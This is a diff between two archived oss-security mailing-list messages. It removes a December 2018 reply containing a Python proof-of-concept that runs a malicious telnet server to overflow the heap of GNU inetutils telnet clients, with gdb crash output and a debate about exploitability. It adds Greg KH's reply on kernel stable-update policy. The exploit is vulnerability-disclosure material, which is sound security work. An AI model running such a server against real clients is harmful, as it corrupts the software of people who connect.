@@ -1,149 +1,140 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/12/13/2
-Message-ID: <CAG-OieMJ=sJxrf37ndMZF8akPtTibc-RMAgi8+Dkxz5URabR+A@mail.gmail.com>
-Date: Wed, 12 Dec 2018 17:21:05 -0800
-From: Hacker Fantastic <hackerfantastic@...glemail.com>
-To: Tavis Ormandy <taviso@...gle.com>
-Cc: oss-security@...ts.openwall.com
-Subject: Re: Multiple telnet.c overflows
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/12/13/8
+Message-ID: <20181213135943.GA23987@kroah.com>
+Date: Thu, 13 Dec 2018 14:59:43 +0100
+From: Greg KH <greg@...ah.com>
+To: oss-security@...ts.openwall.com
+Cc: Jann Horn <jannh@...gle.com>
+Subject: Re: Linux kernel: userfaultfd bypasses tmpfs file permissions (CVE-2018-18397; since 4.11; fixed in 4.14.87 and 4.19.7)
 Content-Type: text/plain; charset=utf-8
 
-Please see the below proof of concept in triggering the heap overflow using
-the IAC SB TELQUAL_IS environment option variable assignment. As per my
-original advisory, which did not fully indicate the details but gave the
-overview of how to trigger the condition.
+On Wed, Dec 12, 2018 at 03:24:15PM +0100, Solar Designer wrote:
+> On Wed, Dec 12, 2018 at 01:27:13AM +0100, Jann Horn wrote:
+> > NOTE: I have requested a CVE identifier, and I'm sending this message,
+> > to make tracking of the fix easier; however, to avoid missing security
+> > fixes without CVE identifiers, you should *NOT* be cherry-picking a
+> > specific patch in response to a notification about a kernel security
+> > bug.
+> 
+> (I resisted the urge to comment on this piece in previous postings.)
+> 
+> What should distros/users do, then?  Use latest mainline or upstream
+> stable kernels?  That would expose them to the many recent bugs like
+> this one, but which haven't yet been found (or not yet made public,
+> which is worse).
 
-#!/usr/bin/env python
-# Proof-of-concept exploit to settle debate on remote
-# exploitability of telnet client overflows identified
-# by Hacker House in previous advisory.
-#
-# Starting program: /usr/bin/telnet 127.0.0.1 2323
-# Trying 127.0.0.1...
-# Connected to 127.0.0.1.
-# Escape character is '^]'.
-#
-# Program received signal SIGSEGV, Segmentation fault.
-# 0x0000555555561172 in ?? ()
-# (gdb) i r
-# rax            0x0                 0
-# rbx            0x55555557b100      93824992391424
-# rcx            0x0                 0
-# rdx            0x1203              4611
-# rsi            0x1                 1
-# rdi            0x203               515
-# rbp            0x0                 0x0
-# rsp            0x7fffff7ff000      0x7fffff7ff000
-# r8             0x0                 0
-# r9             0x0                 0
-# r10            0x0                 0
-# r11            0x246               582
-# r12            0x55555556e3c4      93824992338884
-# r13            0x555555586140      93824992436544
-# r14            0x55555557b140      93824992391488
-# r15            0x41                65
-# rip            0x555555561172      0x555555561172
-# eflags         0x10246             [ PF ZF IF RF ]
-# cs             0x33                51
-# ss             0x2b                43
-# ds             0x0                 0
-# es             0x0                 0
-# fs             0x0                 0
-# gs             0x0                 0
-#
-# -- Hacker Fantastic
-# 12/12/2018 - h0h0h0 merry xmas
-# https://hacker.house
+Which is better, to be running a system with unkown or known bugs? :)
 
-import sys
-import socket
+I'd pick unknown, as you are a _bit_ safer that way.
 
-# telnet initial negotiation
-buffer = b'\xff\xfd\x18\xff\xfd\x20\xff\xfd\x23\xff\xfd\x27'
+> As far as I can tell, by far most Linux kernel vulnerabilities (that are
+> eventually found and made public) are in relatively recent (as of that
+> time) kernel versions.  So a user or a distro would avoid most
+> vulnerabilities (that are eventually found and made public) by staying
+> sufficiently behind current versions, and relying on backports, even if
+> at risk of missing untracked vulnerabilities.
 
-# Send malformed and oversized IAC telnet options
-buffer2 =b'\xff\xfa\x18\x01'  # set linespeed
-buffer2 +=b'A'*5000
-buffer2 +=b'\xff\xf0'         # end option
+Who are you relying on for those backports?
 
-HOST = '0.0.0.0'
-PORT = 2323
+And what about all of the backports that do not get made?  Just look a
+the spectre patches for loads of examples of that.
 
-if __name__ == "__main__":
-    print("[+] GNU/inetutils <= 1.9.4 telnet client heap overflow (IAC
-TELQUAL_IS)")
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.bind((HOST, PORT))
-        s.listen()
-        conn, addr = s.accept()
-        while conn:
-            print("[-] connected, corrupting client heap")
-            conn.sendall(buffer)
-            conn.sendall(buffer2)
-        s.close()
+> Currently this can be
+> achieved e.g. by using RHEL7'ish kernels forked by Red Hat off 3.10, but
+> probably not anything newer than that yet.  (And when RHEL7 was just
+> released, its kernels were not quite ready for such use.  It takes
+> even RHEL kernels a few years and a few hundred revisions to mature and
+> become a lower security risk.  Fortunately, there's a previous RHEL at a
+> few years and a few hundred revisions old yet still maintained during
+> that time.)
 
+If you want to rely on RHEL, that's wonderful, but you are tying
+yourself to some unknown developers doing some unknown work (figuring
+out what they have, and have not applied, is non-trivial.)  Those
+developers do great work, and I strongly recommend people use enterprise
+distros if you can afford them, but it will cost you both time and
+money to do so.
 
-On Wed, Dec 12, 2018 at 12:10 PM Tavis Ormandy <taviso@...gle.com> wrote:
+If you don't have the time or money, then I strongly recommend using the
+latest stable updates, as they are faster and free :)
 
-> On Wed, Dec 12, 2018 at 11:35 AM Hacker Fantastic
-> <hackerfantastic@...glemail.com> wrote:
-> >
-> > Hi Tavis,
-> >
-> > The "little used" package you mentioned is in some distributions a
-> dependency of "xorg-xinit" (:: removing inetutils breaks dependency
-> 'inetutils' required by xorg-xinit in Arch Linux). The security boundary in
-> the Mikrotik example is "escape of restricted shells" which is also in the
-> TLDR; advisory. If you are unhappy with how I described the issue and wish
-> to spend time and ultimately money researching remotely reachable code
-> paths (aside from the URI handler example I already gave you) then it is
-> worth looking into more detail the issues with the heap overflow and if it
-> is reachable in the client via a server-side telnetd implementation for
-> instance. The code there is a mess.
-> >
-> > As I already stated, I am unable to account for every use of telnet
-> client-side code or how it is called in every application, particularly all
-> the projects out there used from open-source community or co-opted by
-> vendors into commercial offerings (like the given example, Mikrotik).
-> Splitting hairs over security boundaries of a single issue with many use
-> cases is not something I have time for, the vulnerability is exactly as
-> described with security relevant impacts in my original advisory. It would
-> be nice to see the heap overflow reached via a telnetd service just to
-> prove a point but ultimately it is beyond the scope of this discussion, why
-> not put the energy you spent on these emails to use exploring if the heap
-> is also corrupted in such instances? ;-)
-> >
->
-> The energy I spent asking if a security boundary being crossed was
-> minimal. I think the answer is that you do not know of any cases of
-> this being a security boundary, but you feel that all bugs are
-> security bugs whether or not a security boundary is crossed, because
-> you don't know how someone might be using the software.
->
-> > It was considered a security issue for such straight-forward restricted
-> shell escapes in 2004/2005 (when there were numerous reported instances of
-> such occurring in telnet clients alongside other client-side overflows).
-> One of the issues is addressed in the implementations of some BSD clients
-> and not in others.
-> >
-> > Just because you do not know how to exploit a bug does not mean it does
-> not have security implications, it just means they have not been discovered
-> yet or the researcher does not have the luxury of time that others have.
-> >
-> > I hope this clarifies my points satisfactorily for you.
->
-> It certainly does, thank you. I think we disagree on what qualifies as
-> a vulnerability, but I'm still very grateful for you reporting this.
->
-> Tavis.
->
+> A question to ask may be: out of Linux kernel vulnerabilities being
+> patched, are there more high and critical overall severity (e.g., as
+> risk impact times risk probability) vulnerabilities found in "too
+> recent" kernels than there are high and critical severity untracked
+> vulnerabilities (also or instead) affecting "sufficiently old" kernels?
 
+How do we really ever know this?  No one is looking at the "old" kernels
+in the same way, and lots of things get fixed accidentally or just
+dropped entirely due to newer kernels rewriting that code.
 
--- 
-Matthew Hickey
-Tel: +44 7543 661237
-Web: http://blog.hackerfantastic.com
+But you can look at the work that the syzbot people are doing for
+concrete evidence that they are finding, and fixing bugs in newer
+kernels that do not get fixed in older kernels, and are still present in
+those older kernels.  I think they are averaging about 10k bugs found a
+year so far.
 
-Please visit my website for blog postings, status updates and project
-information.
+> My gut feeling is there are many more such vulnerabilities in "too
+> recent" kernels than there are those untracked vulnerabilities in
+> "sufficiently old" kernels.
 
+Guts are hard to measure :)
+
+> (BTW, a vulnerability being untracked likely correlates with it being
+> a lower risk probability at least for non-targeted attacks.)  Hence
+> optimal strategy for a distro and their users is to stay with
+> "sufficiently old" base versions and backport whatever is known to be
+> worthy of a backport.
+> 
+> There are no maintained upstream stable branches started long enough ago
+> for them to be as mature as e.g. RHEL7 kernels are now.  Besides,
+> upstream stable branches also suffer from lack of backports of fixes for
+> untracked vulnerabilities.
+
+I try to backport everything we can find, but yes, not everything does
+get backported to older stable kernels, we know that.  That's why I
+never recommend using older LTS kernels unless you are forced to (i.e.
+your SoC sucks rocks and is forcing you to do so.)
+
+And don't think of software as "mature", this isn't wine.  Code gets
+worse with age as the environment changes from when it was written.
+Older code is worse as it is harder to maintain and takes more effort
+over time.  Again, if you have the time and money to do so, wonderful,
+but you might want to reconsider your use of that time and money, given
+that many other large groups consider using the latest kernel a better
+use of their time.
+
+Also note that older kernels do not work well on newer hardware for the
+obvious reason.  And newer kernels usually run _faster_ on older
+hardware, we have the benchmarks to prove that.  So you can do more
+work, with older hardware, just by updating your kernel, saving you
+money and time :)
+
+> The recommendation to use latest mainline or upstream stable kernels is
+> safe to give (and in a way even the most responsible one to give), but
+> not necessarily the best to follow.
+
+It all depends on your environment and situation.
+
+As you say, it is the safest to give, but everyone is different and
+needs to do things differently.  I wrote a whole long essay on this
+thing a while ago if people are interested that tries to provide some
+nuance depending on your situation:
+	http://kroah.com/log/blog/2018/08/24/what-stable-kernel-should-i-use/
+
+> I do not have a suggestion on what to do about that as it relates to
+> recommendations/disclaimers on postings such as Jann's.  Ideally, we
+> wouldn't have so many new security vulnerabilities being introduced to
+> new Linux kernels all the time, but that seems unrealistic given the
+> pace of Linux kernel development and growth.
+
+We also wouldn't have as many old security vulnerabilities being found
+in kernels, except that people are actively working to find and fix
+them, which is a good thing!  I would say we fix more old bugs than
+newer ones by far, and the syzbot numbers back that up.
+
+But again, measuring this type of thing is hard, as we all know.
+
+thanks,
+
+greg k-h
